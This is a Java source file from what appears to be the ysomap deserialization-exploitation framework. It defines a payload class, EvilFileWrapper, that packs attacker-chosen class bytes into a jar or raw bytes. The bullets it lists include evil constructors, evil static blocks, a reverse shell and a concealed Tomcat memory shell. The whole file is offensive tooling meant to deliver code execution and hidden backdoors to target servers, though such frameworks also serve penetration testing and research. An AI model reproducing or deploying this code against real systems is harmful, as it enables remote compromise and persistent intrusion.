package ysomap.payloads.java.objects;

import ysomap.bullets.Bullet;
import ysomap.bullets.objects.ClassWithEvilConstructor;
import ysomap.common.annotation.*;
import ysomap.common.util.ColorStyle;
import ysomap.common.util.Logger;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.ClassFiles;
import ysomap.payloads.AbstractPayload;

import java.util.HashMap;
import java.util.Map;

/**
 * @author wh1t3P1g
 * @since 2020/3/15
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Targets({Targets.CODE})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"*"})
@Require(bullets = {"ClassWithEvilConstructor","ClassWithEvilStaticBlock", "ClassWithReverseShell"}, param = false)
public class EvilFileWrapper extends AbstractPayload<byte[]> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof byte[];
    }

    @Override
    public byte[] pack(Object obj) throws Exception {
        String type = bullet.get("type");
        if(type.equals("jar")){
            String classname = bullet.get("classname");
            Map<String, byte[]> classes = new HashMap<>();
            classes.put(classname, (byte[]) obj);
            if(bullet.getClass().getSimpleName().equals("ClassWithTomcatConcealedMemShell")){
                return ClassFiles.makeJarWithCopyClazz((byte[]) obj,bullet.get("classname"));
            }else {
                return ClassFiles.makeJarWithMultiClazz(classname + ".jar", classes);
            }
        }else {
            return (byte[]) obj;
        }
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ClassWithEvilConstructor.newInstance(args);
    }

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("empty");
    }
}
